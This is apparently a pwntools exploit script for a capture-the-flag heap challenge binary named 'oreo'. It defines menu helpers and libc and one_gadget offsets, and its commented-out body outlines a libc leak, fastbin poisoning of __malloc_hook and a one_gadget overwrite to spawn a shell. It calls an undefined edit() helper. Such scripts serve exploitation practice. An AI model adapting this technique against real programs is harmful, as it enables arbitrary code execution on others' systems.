from pwn import *
context(
	log_level='debug',
	binary='./oreo'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('choice :',str(func))

def add(size,content):
	menu(1)
	io.sendlineafter('size :',str(size))
	io.sendlineafter('Content :',str(content))

def delete(index):
	menu(2)
	io.sendlineafter('Index :',str(index))

def show(index):
	menu(3)
	io.sendlineafter('Index :',str(index))

#=========================================
#VAR
leak_libc_off = 0x3c4b78
one_gadget=[283158,283242,983716,987463]

#=========================================





# add(0x20,'aaaa') #0
# add(0x20,'bbbb') #1

# delete(0)
# show(0)
# libc.address = u64(io.recvline()[:-1].ljust(8,'\x00'))-leak_libc_off
# success("libc base: " + hex(libc.address))

# malloc_hook=libc.symbols['__malloc_hook']
# add(0x60) #2
# delete(2) 

# payload = p64(malloc_hook-0x23)
# edit(2,payload)

# add(0x60) #3
# add(0x60) #4

# payload='a'*0x13+p64(libc.address+one_gadget[3])

# edit(4,payload)
# add(111)

# dbg()

# io.interactive()
